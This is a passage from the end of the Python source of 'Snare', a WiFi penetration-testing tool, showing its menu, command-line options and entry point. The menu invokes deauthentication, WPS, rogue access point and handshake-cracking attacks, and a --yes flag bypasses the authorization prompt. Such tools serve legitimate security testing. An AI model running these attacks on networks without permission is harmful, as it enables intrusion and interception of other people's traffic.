                            default_channel=_get_arg("channel"))

        elif choice == "3":
            inp = ask("Captured pcap file", default="captured.pcap")
            out = ask("Output filename", default="decrypted.pcap")
            decrypt_traffic(inp, out)

        elif choice == "4":
            inp = ask("Decrypted pcap file", default="decrypted.pcap")
            out = ask("Output filename", default="network_data.txt")
            extract_data(inp, out)

        elif choice == "5":
            deauth_attack(monitor_iface, networks=last_networks if last_networks else None)

        elif choice == "6":
            crack_handshake()

        elif choice == "7":
            wps_attack(monitor_iface)

        elif choice == "8":
            rogue_ap(original_iface)

        elif choice == "9":
            launch_wifite(monitor_iface)

        elif choice == "t":
            show_tool_status()

        elif choice == "0":
            break

        console.print()

# ─── Entry Point ──────────────────────────────────────────────────────────────

def parse_args():
    parser = argparse.ArgumentParser(
        prog="Snare",
        description="Snare v2.1 — WiFi Penetration Testing Tool (authorized use only)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 Snare.py
  sudo python3 Snare.py --interface wlan0
  sudo python3 Snare.py --interface wlan0 --password MyWiFiPass
  sudo python3 Snare.py --wordlist /usr/share/wordlists/rockyou.txt
  sudo python3 Snare.py --yes   # skip authorization confirmation
        """,
    )
    parser.add_argument("--interface", "-i",  metavar="IFACE",
                        help="Wireless interface to use (skip interactive selection)")
    parser.add_argument("--password", "-p",   metavar="PASS",
                        help="WiFi password for decryption (skips the prompt)")
    parser.add_argument("--ssid", "-s",       metavar="SSID",
                        help="Network SSID for decryption (skips the prompt)")
    parser.add_argument("--wordlist", "-w",   metavar="FILE",
                        help="Default wordlist path for cracking (overrides built-in default)")
    parser.add_argument("--channel", "-c",    metavar="CH",
                        help="Default channel to lock to during capture")
    parser.add_argument("--output", "-o",     metavar="FILE",
                        help="Default output file for captures/results")
    parser.add_argument("--yes", "-y",        action="store_true",
                        help="Skip the authorization confirmation prompt")
    parser.add_argument("--no-monitor",       action="store_true",
                        help="Skip enabling monitor mode (use if already in monitor mode)")
    return parser.parse_args()

def main():
    global _args
    _args = parse_args()

    print_banner()
    check_root()

    if not check_dependencies():
        console.print("\n[dim]Install missing tools and re-run.[/]")
        sys.exit(1)

    if RICH:
        console.print(Panel(
            "[bold yellow]Only test networks you own or have explicit written\n"
            "permission to test.[/]\n\n"
            "Unauthorized use may be illegal in your jurisdiction.",
            title="[red bold]Legal Notice[/]",
            border_style="red",
        ))
    else:
        print("\n*** LEGAL NOTICE ***")
        print("Only test networks you own or have explicit written permission to test.")
        print("Unauthorized use may be illegal.\n")

    if not _args.yes and not confirm("I confirm I have authorization to test the target network"):
        console.print("[red]Exiting.[/]")
        sys.exit(0)

    # Interface — use CLI arg or interactive selection
    if _args.interface:
        iface = _args.interface
        console.print(f"[green][+] Using interface: [bold]{iface}[/][/]")
    else:
        iface = select_interface()
    if not iface:
        sys.exit(1)

    if _args.no_monitor:
        monitor_iface = iface
        console.print(f"[yellow][*] Skipping monitor mode setup, using [bold]{iface}[/] as-is.[/]")
    else:
        monitor_iface = enable_monitor_mode(iface)

    def _cleanup(sig=None, frame=None):
        console.print("\n[yellow][*] Interrupt received — cleaning up...[/]")
        disable_monitor_mode()
        sys.exit(0)

    signal.signal(signal.SIGINT, _cleanup)
    signal.signal(signal.SIGTERM, _cleanup)

    try:
        main_menu(monitor_iface, original_iface=iface)
    finally:
        disable_monitor_mode()

if __name__ == "__main__":
    main()
